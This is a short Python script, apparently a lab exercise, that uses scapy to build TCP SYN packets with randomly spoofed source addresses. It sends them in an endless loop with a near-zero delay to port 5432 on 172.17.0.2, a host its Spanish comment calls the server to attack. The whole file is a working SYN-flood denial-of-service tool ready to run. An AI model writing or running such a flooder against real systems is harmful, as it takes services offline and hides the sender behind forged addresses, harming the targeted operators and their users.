from scapy.all import *

def tcp_syn(ip_address, sport, dport):

    s_addr = RandIP()                         #IP random
    d_addr = ip_address                       #IP server a atacar

    packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport,dport=dport,seq=1505066,flags="S")

    return packet

send(tcp_syn("172.17.0.2",1234,5432),loop=1,inter=0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
